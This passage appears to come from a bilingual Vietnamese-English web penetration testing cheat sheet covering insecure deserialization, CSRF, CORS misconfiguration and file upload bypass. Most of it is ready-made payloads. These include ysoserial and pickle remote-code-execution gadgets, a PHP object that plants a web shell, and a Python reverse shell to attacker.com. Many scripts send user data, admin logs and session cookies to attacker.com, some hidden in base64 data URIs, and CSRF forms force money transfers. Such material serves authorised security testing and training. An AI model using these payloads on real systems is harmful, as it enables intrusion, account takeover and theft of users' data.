    *   *English*: Data streams display standard Java serialization magic bytes (hex `ac ed 00 05` or base64 `rO0AB`).
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi tệp payload URLDNS để kiểm tra xem máy chủ có phân giải DNS trỏ về máy chủ OOB của bạn không.
    *   *English*: Submit a URLDNS serialized object and check for outgoing DNS queries.
*   **Payloads (10 Payloads)**:
```
    # 1. Java Serialization Magic Bytes in hex representation (Hex bytes: 0xAC 0xED 0x00 0x05)
    \xac\xed\x00\x05

    # 2. Base64 representation of Java Serialization Magic Bytes
    rO0AB

    # 3. URLDNS Gadget: Generates a safe payload triggering DNS lookup to verify deserialization
    # java -jar ysoserial.jar URLDNS http://<subdomain>.oast.site

    # 4. CommonsCollections1 Gadget: RCE via Apache Commons Collections 3.1 (Requires Java version < 8u75. For JRE >= 8u75, use CommonsCollections5 or CommonsCollections6 instead)
    # java -jar ysoserial.jar CommonsCollections1 "calc.exe" | base64

    # 5. CommonsCollections5 Gadget: RCE utilizing BadAttributeValueExpException
    # java -jar ysoserial.jar CommonsCollections5 "id"

    # 6. CommonsCollections6 Gadget: Bypasses newer JRE protections by utilizing HashSet object chain
    # java -jar ysoserial.jar CommonsCollections6 "whoami"

    # 7. CommonsBeanutils1 Gadget: RCE targeting Commons Beanutils 1.9.2
    # java -jar ysoserial.jar CommonsBeanutils1 "id"

    # 8. ROME Gadget: RCE via ROME feed processing library
    # java -jar ysoserial.jar ROME "whoami"

    # 9. Jackson Gadget: RCE targeting Jackson databind deserializer
    # java -jar ysoserial.jar Jackson "id"

    # 10. AspectJWeaver Gadget: Triggers file creation/write on host system
    # java -jar ysoserial.jar AspectJWeaver "arbitrary_write_payload"
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng ysoserial để tạo payload Java Serialization RCE tự động.
    *   *English*: Run ysoserial tool to generate custom serialized payload files.
    ```bash
    java -jar ysoserial.jar CommonsCollections6 "id" > cc6.ser
    ```


---

### 10.2. PHP Object Injection
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Tham số truyền đi chứa chuỗi định dạng đối tượng của PHP (như `O:4:"User":2:{...}`).
    *   *English*: Parameter format exhibits standard PHP serialization strings (e.g. `O:4:"User":...`).
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thay đổi giá trị hoặc kiểu dữ liệu trong chuỗi serialize để kích hoạt các hàm ma thuật (`__wakeup`, `__destruct`).
    *   *English*: Tamper with class properties or values to trigger vulnerability logic inside magic methods.
*   **Payloads (10 Payloads)**:
```
    # 1. Tampered user object modifying username property to gain unauthorized privileges
    O:4:"User":1:{s:8:"username";s:5:"admin";}

    # 2. Overwrites class variable logFile pointing to web root inside destructor class
    O:11:"FileManager":1:{s:7:"logFile";s:15:"/var/www/rce.php";}

    # 3. Writes a web shell into web root using clean destruct logic
    O:11:"FileManager":2:{s:7:"logFile";s:15:"/var/www/rce.php";s:7:"logData";s:30:"<?php system($_GET['c']); ?>";}

    # 4. Triggers SQL injection when Database class destructs and runs raw queryStr
    O:8:"Database":1:{s:9:"queryStr";s:26:"DROP TABLE users;-- - - -";}

    # 5. Nested gadget chain where Show::__toString() calls Command::exec
    O:4:"Show":1:{s:4:"item";O:7:"Command":1:{s:4:"exec";s:6:"whoami";}}

    # 6. Triggers shell command execution via destructive cleanup variables
    O:7:"Command":1:{s:4:"args";s:19:"rm -rf /tmp/session";}

    # 7. Hijacks page rendering to execute command using shell_exec callback
    O:10:"CustomView":2:{s:8:"template";s:11:"index.blade";s:12:"renderMethod";s:10:"shell_exec";}

    # 8. Arbitrary file read triggered by __wakeup() retrieving session storage
    O:12:"SessionStore":1:{s:8:"filePath";s:12:"/etc/passwd";}

    # 9. Array object injection designed to check serialization parser recursive handling
    a:2:{i:0;O:4:"User":1:{s:5:"admin";i:1;}i:1;O:4:"User":1:{s:5:"admin";i:1;}}

    # 10. XXE injection payload embedded inside a custom deserialized XML loader (⚠️ String length warning: s:50 must match the exact XML data length)
    O:13:"XMLParserTest":1:{s:7:"xmlData";s:50:"<!DOCTYPE x [<!ENTITY xxe SYSTEM 'http://evil.com'>]>";}
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng các công cụ fuzzing hoặc script tự viết để thay đổi chuỗi PHP serialize tự động.
    *   *English*: Deploy custom python scripts to dynamically generate corrupted serialized PHP classes.
    ```bash
    # Use phpggc to generate a serialized object targeting Guzzle RCE gadget chain
    phpggc Guzzle/RCE1 system "id"
    # Use a local PHP CLI one-liner to generate a custom serialized payload
    php -r 'class User { public $username = "admin"; } echo serialize(new User());'
    ```


---

### 10.3. Python Pickle
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Dữ liệu lưu trong Cookie hoặc tham số chứa chuỗi Base64 bắt đầu bằng ký tự `gASV`.
    *   *English*: Base64 parameter string decodes to Python Pickle opcode bytes (starts with `gASV`).
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Viết đoạn script Python tạo lớp đối tượng có hàm `__reduce__` thực thi lệnh hệ thống và mã hóa Base64 gửi lên ứng dụng.
    *   *English*: Build a class overriding `__reduce__` with system commands, encode the pickle output to base64, and transmit it.
*   **Payloads (10 Payloads)**:
```python
    # 1. Pickle bytecode executing os.system('id')
    cos\nsystem\n(S'id'\ntR.

    # 2. Bypasses simple function restrictions by calling eval() in pickle bytecode
    cbuiltins\neval\n(S"__import__('os').system('id')"\ntR.

    # 3. Base64 representation of Pickle RCE executing 'os.system("id")' using builtins.eval
    gASVOQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwdX19pbXBvcnRfXygib3MiKS5zeXN0ZW0oImlkIimUhZRSlC4=

    # 4. Subprocess Popen payload (Python script helper)
    # import pickle, subprocess
    # class Exploit(object):
    #     def __reduce__(self):
    #         return (subprocess.Popen, (['whoami'],))
    # print(pickle.dumps(Exploit()))

    # 5. Python socket reverse shell payload
    # import pickle, os
    # class Exploit(object):
    #     def __reduce__(self):
    #         return (os.system, ('python3 -c "import socket,subprocess;s=socket.socket();s.connect(('attacker.com',9001));[os.dup2(s.fileno(),i) for i in (0,1,2)];subprocess.call(['/bin/sh','-i'])"',))

    # 6. Global variables extraction payload
    # class Leak(object):
    #     def __reduce__(self):
    #         return (eval, ("globals()",))

    # 7. File system extraction using pickle load mapping
    # class FileRead(object):
    #     def __reduce__(self):
    #         return (open, ('/etc/passwd',))

    # 8. Pickle bytecode executing subprocess check_output
    csubprocess\ncheck_output\n((S'id'\nS'shell=True'\ntR.

    # 9. Pickle bytecode executing a local file write
    cbuiltins\nopen\n(S'/tmp/pwn'\nS'w'\ntR.

    # 10. Alternative Pickle payload using os.popen read
    cos\npopen\n(S'id'\ntR.
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng script python tự viết để sinh payload Pickle nhanh chóng.
    *   *English*: Compile dynamic python pickle payload builders.
    ```bash
    python -c 'import pickle, base64; print(base64.b64encode(pickle.dumps(Exploit())))'
    ```

---

## 11. CSRF (Cross-Site Request Forgery)

CSRF (Cross-Site Request Forgery) xảy ra khi ứng dụng cho phép thực hiện các hành động nhạy cảm thông qua các request từ trình duyệt của nạn nhân mà không xác thực nguồn gốc request (Origin/Token), cho phép kẻ tấn công ép trình duyệt nạn nhân gửi request ngoài ý muốn.

### 11.1. Basic GET & POST CSRF
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xuất hiện trên các chức năng thay đổi trạng thái (như đổi mật khẩu, chuyển khoản) không có cơ chế bảo vệ chống CSRF, và ứng dụng hoàn toàn dựa trên Cookie phiên làm việc mặc định của trình duyệt.
    *   *English*: Found on state-changing requests lacking CSRF tokens, relying solely on standard session cookies.

    ```bash
    # Send a simulated GET CSRF request using curl
    curl "http://target.com/api/v1/transfer?amount=1000&to=attacker"
    # Send a simulated POST CSRF request using curl
    curl -X POST -d "amount=1000&to=attacker" http://target.com/api/v1/transfer
    ```
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Dựng một trang HTML kiểm thử chứa các thẻ tự động gửi request đến ứng dụng mục tiêu và xem yêu cầu có được thực thi thành công hay không.
    *   *English*: Construct a simple HTML test page that triggers requests to target routes when loaded in a session.
*   **Payloads (10 Payloads)**:
```html
    <!-- 1. GET CSRF via Image tag -->
    <img src="http://target.com/api/v1/transfer?amount=1000&to=attacker" width="0" height="0" />

    <!-- 2. GET CSRF via Audio tag -->
    <audio src="http://target.com/api/v1/transfer?amount=1000&to=attacker" autoplay></audio>

    <!-- 3. GET CSRF via Video tag -->
    <video src="http://target.com/api/v1/transfer?amount=1000&to=attacker" autoplay></video>

    <!-- 4. GET CSRF via Link tag (pre-fetching resources) -->
    <link rel="prefetch" href="http://target.com/api/v1/transfer?amount=1000&to=attacker" />

    <!-- 5. GET CSRF via Iframe tag -->
    <iframe src="http://target.com/api/v1/transfer?amount=1000&to=attacker" style="display:none;"></iframe>

    <!-- 6. Basic POST CSRF via HTML Form auto-submit -->
    <form id="csrfForm" action="http://target.com/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
    </form>
    <script>document.getElementById("csrfForm").submit();</script>

    <!-- 7. SameSite Lax Bypass via GET-to-POST method conversion (changing method to GET in form) -->
    <form id="csrfForm" action="http://target.com/api/v1/transfer" method="GET">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
    </form>
    <script>document.getElementById("csrfForm").submit();</script>

    <!-- 8. POST CSRF via JavaScript fetch API (CORS must allow credentials) -->
    <script>
      fetch('http://target.com/api/v1/transfer', {
        method: 'POST',
        credentials: 'include',
        body: new URLSearchParams({amount: '1000', to: 'attacker'})
      });
    </script>

    <!-- 9. POST CSRF using multipart/form-data to bypass standard check -->
    <form id="csrfForm" action="http://target.com/api/v1/transfer" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
    </form>
    <script>document.getElementById("csrfForm").submit();</script>

    <!-- 10. SameSite Lax Bypass via user interaction click coercion -->
    <a href="http://target.com/api/v1/transfer?amount=1000&to=attacker" id="exploitLink">Claim Reward</a>
    <script>document.getElementById("exploitLink").click();</script>
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng tính năng "Generate CSRF PoC" của Burp Suite Professional để tạo nhanh tệp HTML khai thác.
    *   *English*: Use Burp Suite Professional's "Generate CSRF PoC" action in Engagement tools to automate exploit page setup.


---

### 11.2. Token Bypass CSRF
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng có sử dụng CSRF tokens nhưng cơ chế kiểm tra mã token ở máy chủ có lỗi logic.
    *   *English*: CSRF tokens are implemented in parameters, but the server's validation logic contains vulnerabilities.

    ```bash
    # Submit a request with the CSRF token parameter completely removed
    curl -X POST -d "amount=1000&to=attacker" http://target.com/api/v1/transfer
    # Submit a request with an empty CSRF token parameter
    curl -X POST -d "amount=1000&to=attacker&csrf_token=" http://target.com/api/v1/transfer
    ```
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử xóa tham số token, gửi token rỗng, thay đổi phương thức yêu cầu hoặc thử đổi kiểu Content-Type.
    *   *English*: Try omitting the token parameter, passing an empty token, changing POST to GET, or mapping requests to alternative Content-Types.
*   **Payloads (10 Payloads)**:
```html
    <!-- 1. CSRF Token parameter completely removed from request -->
    <form action="http://target.com/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 2. CSRF Token provided with an empty value -->
    <form action="http://target.com/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="csrf_token" value="" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 3. Change request method from POST to GET to bypass token check -->
    <img src="http://target.com/api/v1/transfer?amount=1000&to=attacker" />

    <!-- 4. Swap csrf_token with another user's valid session token -->
    <form action="http://target.com/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="csrf_token" value="VALID_TOKEN_FROM_OTHER_USER" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 5. Static or expired token reuse bypass -->
    <form action="http://target.com/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="csrf_token" value="REUSED_STATIC_TOKEN" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 6. Token pattern guessing bypass using predictable timestamps or MD5 -->
    <form action="http://target.com/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="csrf_token" value="c4ca4238a0b923820dcc509a6f75849b" /> <!-- MD5 of '1' -->
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 7. Swap content type from application/json to application/x-www-form-urlencoded -->
    <form action="http://target.com/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to" value="attacker" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 8. JSON CSRF with text/plain enctype (avoids preflight check) -->
    <form action="http://target.com/api/v1/transfer" method="POST" enctype="text/plain">
      <input type="hidden" name='{"amount": 1000, "to": "attacker", "dummy": "' value='test"}' />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 9. Preflight bypass by setting custom header mapping via Flash or plugins -->
    <object data="http://target.com/api/v1/transfer" type="application/x-shockwave-flash">
      <param name="flashvars" value="csrf=1" />
    </object>

    <!-- 10. CSRF Token leak via Referer header extraction script -->
    <script>
      // Attacker site script extracting leaked token from history/referrer
      console.log("Leaked referrer: " + document.referrer);
    </script>
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Burp Suite Intruder để thực hiện lặp lại request loại bỏ hoặc chỉnh sửa các giá trị token tự động.
    *   *English*: Run Burp Suite Intruder to strip, empty, or cycle CSRF parameters dynamically.


---

### 11.3. Cookie & Origin Bypass CSRF
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng sử dụng cơ chế bảo vệ Double Submit Cookie hoặc chỉ kiểm tra Referer/Origin headers.
    *   *English*: Target application validates referer/origin headers or applies Double Submit Cookie protection.

    ```bash
    # Test Origin header bypass by modifying the Origin header in a request
    curl -H "Origin: http://evil.com" -X POST -d "amount=1000&to=attacker" http://target.com/api/v1/transfer
    ```
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Sử dụng XSS trên subdomain để ghi đè Cookie, hoặc dùng thẻ Referrer-Policy để ẩn header Referer.
    *   *English*: Exploit XSS on subdomains to inject cookie strings or deploy meta tags to drop Referer headers.
*   **Payloads (10 Payloads)**:
```html
    <!-- 1. Double Submit Cookie Bypass using XSS to inject subdomain cookie -->
    <script>
      document.cookie = "csrf_token=attackertoken; domain=.target.com; path=/";
      // Now submit form with token value matching the cookie 'attackertoken'
    </script>

    <!-- 2. Double Submit Cookie Bypass using CRLF injection to set cookie on target domain -->
    <a href="http://target.com/redirect?url=/%0d%0aSet-Cookie:%20csrf_token=attackertoken;%20Domain=.target.com">Set Token Cookie</a>

    <!-- 3. Referer header bypass via Referrer Policy Meta tag (suppressing Referer) -->
    <meta name="referrer" content="no-referrer" />
    <form action="http://target.com/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 4. Referer header bypass via Regex Subdomain Spoofing -->
    <!-- Host this exploit file on: http://target.com.attacker.com/exploit.html -->
    <form action="http://target.com/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 5. SameSite Lax Bypass via Open Redirect helper -->
    <script>
      window.location = "http://target.com/redirect?url=http://target.com/api/v1/transfer?amount=1000";
    </script>

    <!-- 6. Cross-Site WebSocket Hijacking (CSWSH) basic exploit -->
    <script>
      var ws = new WebSocket("ws://target.com/api/v1/chat");
      ws.onopen = function() { ws.send("Hello"); };
    </script>

    <!-- 7. Origin header spoofing using custom HTTP headers (for server-to-server proxies) -->
    <script>
      // Triggered on vulnerable node server proxying request
    </script>

    <!-- 8. Referer regex bypass containing path segment -->
    <!-- Host this file on: http://attacker.com/target.com/exploit.html -->
    <form action="http://target.com/api/v1/transfer" method="POST">
      <input type="hidden" name="amount" value="1000" />
    </form>
    <script>document.forms[0].submit();</script>

    <!-- 9. CSWSH with origin validation bypass using custom subdomains -->
    <script>
      var ws = new WebSocket("ws://sub.target.com/api/v1/chat");
    </script>

    <!-- 10. SameSite Lax bypass via client-side cookie manipulation in target site -->
    <script>
      // Exploit page setting cookies dynamically before redirecting
    </script>
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Burp Suite Repeater để kiểm tra phản hồi của máy chủ khi loại bỏ hoặc thay đổi Header Origin/Referer.
    *   *English*: Use Burp Suite Repeater to verify server response when Origin or Referer header modifications are performed.

---

## 12. CORS Misconfiguration (Cross-Origin Resource Sharing)

CORS Misconfiguration xảy ra khi chính sách chia sẻ tài nguyên nguồn gốc chéo (CORS) được cấu hình quá lỏng lẻo (ví dụ: chấp nhận mọi origin có thông tin đăng nhập), cho phép các trang web độc hại đọc dữ liệu nhạy cảm của người dùng.

### 12.1. Basic CORS Exploitation (Dynamic Origin Reflect & Credentials)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi gửi yêu cầu với header `Origin: http://evil.com`, máy chủ phản hồi có chứa các header `Access-Control-Allow-Origin: http://evil.com` và `Access-Control-Allow-Credentials: true`.
    *   *English*: Server reflects arbitrary request `Origin` header values alongside the `Access-Control-Allow-Credentials: true` validation header.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Dùng curl gửi request có chứa header `Origin` tùy ý và kiểm tra xem tiêu đề CORS trả về có phản chiếu đúng tên miền đó không.
    *   *English*: Issue a curl request with a custom `Origin` header and inspect HTTP headers in the response.
*   **Payloads (10 Payloads)**:
```html
    <!-- 1. Basic dynamic origin reflection payload with credentials -->
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "http://target.com/api/v1/user", true);
      xhr.withCredentials = true;
      xhr.onload = function() {
        fetch("http://attacker.com/log?data=" + btoa(xhr.responseText));
      };
      xhr.send();
    </script>

    <!-- 2. Dynamic origin reflection using modern Fetch API -->
    <script>
      fetch("http://target.com/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://attacker.com/log?data=" + btoa(d)));
    </script>

    <!-- 3. Dynamic origin reflection targeting custom JSON profiles -->
    <script>
      var req = new XMLHttpRequest();
      req.open("GET", "http://target.com/api/v1/profile", true);
      req.withCredentials = true;
      req.onreadystatechange = function() {
        if (req.readyState == 4) {
          navigator.sendBeacon("http://attacker.com/log", req.responseText);
        }
      };
      req.send();
    </script>

    <!-- 4. Wildcard CORS extraction payload (no credentials, extracting public/static API) -->
    <script>
      fetch("http://target.com/api/v1/public-configs")
        .then(r => r.json())
        .then(d => console.log(d));
    </script>

    <!-- 5. Dynamic Origin reflection targeting admin logs -->
    <script>
      fetch("http://target.com/api/admin/logs", {credentials: "include"})
        .then(r => r.text())
        .then(t => new Image().src = "http://attacker.com/log?t=" + encodeURIComponent(t));
    </script>

    <!-- 6. Insecure HTTP origin allowed by HTTPS site -->
    <!-- Host this page on: http://insecure-domain.com/exploit.html -->
    <script>
      fetch("https://target.com/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(t => fetch("http://attacker.com/log?data=" + t));
    </script>

    <!-- 7. Dynamic reflection with custom authorization headers (if allowed by server) -->
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "http://target.com/api/v1/data", true);
      xhr.setRequestHeader("Authorization", "Bearer token");
      xhr.onload = function() { console.log(xhr.responseText); };
      xhr.send();
    </script>

    <!-- 8. Dynamic Origin reflection testing other HTTP verbs (e.g. PUT/DELETE) -->
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open("PUT", "http://target.com/api/v1/settings", true);
      xhr.withCredentials = true;
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.send(JSON.stringify({email: "attacker@evil.com"}));
    </script>

    <!-- 9. Dynamically reflective origin check on SOAP API responses -->
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "http://target.com/api/v1/soap", true);
      xhr.withCredentials = true;
      xhr.setRequestHeader("Content-Type", "text/xml");
      xhr.send("<soapenv:Envelope>...</soapenv:Envelope>");
    </script>

    <!-- 10. CORS reflection exploitation via custom frame messaging -->
    <script>
      window.addEventListener("message", function(e) {
        fetch("http://target.com/api/v1/user", {credentials: "include"})
          .then(r => r.text())
          .then(t => e.source.postMessage(t, e.origin));
      });
    </script>
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Corsy để quét tự động các lỗi CORS liên quan đến phản chiếu Origin động.
    *   *English*: Run Corsy tool to scan target URLs for dynamic origin reflection vulnerabilities.
    ```bash
    python corsy.py -u "http://target.com"
    ```


---

### 12.2. CORS Trust Bypass (Null Origin & Localhost Trust)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Máy chủ mục tiêu được cấu hình chấp nhận `null` origin hoặc tin tưởng hoàn toàn tên miền localhost (`http://localhost`).
    *   *English*: Target application permits origin connections matching `null` or `localhost`.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi yêu cầu với header `Origin: null` hoặc `Origin: http://localhost` và xem phản hồi CORS có cho phép không.
    *   *English*: Send `Origin: null` or `Origin: http://localhost` headers and check CORS permissions.
*   **Payloads (10 Payloads)**:
```html
    <!-- 1. Exploit CORS Null Origin via sandboxed iframe -->
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
      <script>
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://target.com/api/v1/user', true);
        xhr.withCredentials = true;
        xhr.onload = function() {
          fetch('http://attacker.com/log?data=' + btoa(xhr.responseText));
        };
        xhr.send();
      </script>
    "></iframe>

    <!-- 2. Exploit CORS Null Origin via Data URI Redirection -->
    <script>
      // Triggers browser redirection to data uri hosting the script
      // Redirection causes Origin header to be set to 'null'
      window.location = 'data:text/html;base64,PHNjcmlwdD52YXIgeGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3hoci5vcGVuKCdHRVQnLCdodHRwOi8vdGFyZ2V0LmNvbS9hcGkvdjEvdXNlcicsdHJ1ZSk7eGhyLndpdGhDcmVkZW50aWFscz10cnVlO3hoci5vbmxvYWQ9ZnVuY3Rpb24oKXtsb2NhdGlvbi5ocmVmPSdodHRwOi8vYXR0YWNrZXIuY29tL2xvZz9kYXRhPScrYnRvYSh4aHIucmVzcG9uc2VUZXh0KTt9O3hoci5zZW5kKCk7PC9zY3JpcHQ+';
    </script>

    <!-- 3. Double sandboxed iframe helper to force Null Origin -->
    <iframe sandbox="allow-scripts" srcdoc="
      <iframe sandbox='allow-scripts' srcdoc='
        <script>
          fetch("http://target.com/api/v1/user", {credentials: "include"})
            .then(r => r.text())
            .then(d => parent.postMessage(d, "*"));
        </script>
      '></iframe>
    "></iframe>

    <!-- 4. Exploit Localhost Trust (standard HTTP) -->
    <!-- Host this script on attacker domain to fetch localhost resource -->
    <script>
      fetch("http://localhost:80/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log("Localhost data: " + d));
    </script>

    <!-- 5. Exploit Localhost Trust on custom port -->
    <script>
      fetch("http://localhost:8080/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://attacker.com/log?data=" + d));
    </script>

    <!-- 6. Exploit Localhost Trust on alternate loopback address -->
    <script>
      fetch("http://127.0.0.1:80/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 7. Exploit Localhost Trust using IPv6 loopback [::1] -->
    <script>
      fetch("http://[::1]:80/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 8. Sandboxed iframe dynamic creation to execute multiple Null Origin queries -->
    <script>
      var frame = document.createElement('iframe');
      frame.setAttribute('sandbox', 'allow-scripts');
      frame.srcdoc = '<script>fetch("http://target.com/api").then(r=>r.text()).then(t=>parent.postMessage(t,"*"))</script>';
      document.body.appendChild(frame);
    </script>

    <!-- 9. Null origin base64 data URI payload mapping image source -->
    <script>
      window.location = "data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPSJmZXRjaCgnaHR0cDovL3RhcmdldC5jb20vYXBpL3YxL3VzZXInLCB7Y3JlZGVudGlhbHM6J2luY2x1ZGUnfSkudGhlbihyPT5yLnRleHQoKSkudGhlbihkPT5mZXRjaCgnaHR0cDovL2F0dGFja2VyLmNvbS8nK2QpKSI+";
    </script>

    <!-- 10. Local page file protocol load causing Null Origin -->
    <!-- file:// scheme sends Origin: null -->
    <script>
      fetch("http://target.com/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => alert("Saved file exploit: " + d));
    </script>
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng curl để gửi giá trị Origin đặc trị.
    *   *English*: Use curl command to quickly probe for local or null origin trust.
    ```bash
    curl -H "Origin: null" -I "http://target.com/api"
    curl -H "Origin: http://localhost" -I "http://target.com/api"
    ```


---

### 12.3. Advanced CORS Bypass (Regex & Subdomain XSS Exploitation)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Bộ lọc Origin của ứng dụng sử dụng biểu thức chính quy (Regex) không chặt chẽ, cho phép các tên miền có hậu tố hoặc tiền tố khớp với tên miền thật.
    *   *English*: Server validation regexes accept origins containing target domain strings as prefix/suffix.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi yêu cầu với tên miền dạng `target.com.attacker.com` hoặc `targetxcom.com` và rà soát phản hồi CORS.
    *   *English*: Try domains like `target.com.attacker.com` or `targetxcom.com` in the Origin header.
*   **Payloads (10 Payloads)**:
```html
    <!-- 1. Regex Bypass: Suffix Match (Domain ending in target.com) -->
    <!-- Host this file on: http://attacker-target.com/exploit.html -->
    <script>
      fetch("http://target.com/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://attacker.com/log?data=" + d));
    </script>

    <!-- 2. Regex Bypass: Subdomain Spoof (Domain starting with target.com) -->
    <!-- Host this file on: http://target.com.attacker.com/exploit.html -->
    <script>
      fetch("http://target.com/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://attacker.com/log?data=" + d));
    </script>

    <!-- 3. Regex Bypass: Dot Unescaped (target.com matched as targetxcom) -->
    <!-- Host this file on: http://targetxcom.com/exploit.html -->
    <script>
      fetch("http://target.com/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://attacker.com/log?data=" + d));
    </script>

    <!-- 4. Regex Bypass: Special character insertion (e.g. target.com_attacker.com) -->
    <!-- Host this file on: http://target.com_attacker.com/exploit.html -->
    <script>
      fetch("http://target.com/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 5. Regex Bypass: Using hyphen inside subdomain segment -->
    <!-- Host this file on: http://trusted-target.com.attacker.com/exploit.html -->
    <script>
      fetch("http://target.com/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 6. CORS Bypass via XSS on Trusted Subdomain -->
    <!-- If subdomain 'trusted.target.com' has XSS, inject this script there -->
    <script>
      fetch("http://target.com/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => fetch("http://attacker.com/log?data=" + d));
    </script>

    <!-- 7. CORS Bypass via XSS on trusted third-party CDN domain -->
    <!-- If target trusts 'trusted-cdn.com' and it has XSS, load script there -->
    <script>
      fetch("http://target.com/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 8. URL encoding bypass in origin header (browser dependent) -->
    <script>
      // Sent with custom crafted Origin header containing %0d%0a or similar
    </script>

    <!-- 9. Suffix match bypass with custom port mapping -->
    <!-- Host this file on: http://attacker-target.com:8080/exploit.html -->
    <script>
      fetch("http://target.com/api/v1/user", {credentials: "include"})
        .then(r => r.text())
        .then(d => console.log(d));
    </script>

    <!-- 10. Advanced subdomain XSS combined with dynamic credentialed request -->
    <script>
      // Injected into vulnerable subdomain to steal global session cookie values
      var token = document.cookie.match(/session=([^;]+)/)[1];
      console.log("Stealed: " + token);
    </script>
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Corsy với wordlist tùy biến các tên miền bypass regex.
    *   *English*: Run Corsy with custom domains list to detect regex bypass errors.
    ```bash
    python corsy.py -u "http://target.com" -p regex_bypass_origins.txt
    ```

---

## 13. File Upload Bypass

File Upload Bypass xảy ra khi chức năng tải tệp tin lên máy chủ không kiểm tra kỹ lưỡng định dạng tệp, nội dung tệp hoặc quyền thực thi, cho phép kẻ tấn công tải lên mã độc (Web Shell) và thực thi mã nguồn.

### 13.1. File Extension & Name Manipulation Bypass
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi gửi yêu cầu tải tệp với đuôi `.php` thì bị chặn và trả về thông báo lỗi "File extension not allowed".
    *   *English*: Standard `.php` file uploads return "extension not allowed" exceptions from application validators.

    ```bash
    # Use curl to upload a file with a double extension
    curl -F "file=@shell.p.phphp" http://target.com/upload
    # Use curl to upload a file with a mixed-case extension
    curl -F "file=@shell.pHp" http://target.com/upload
    ```
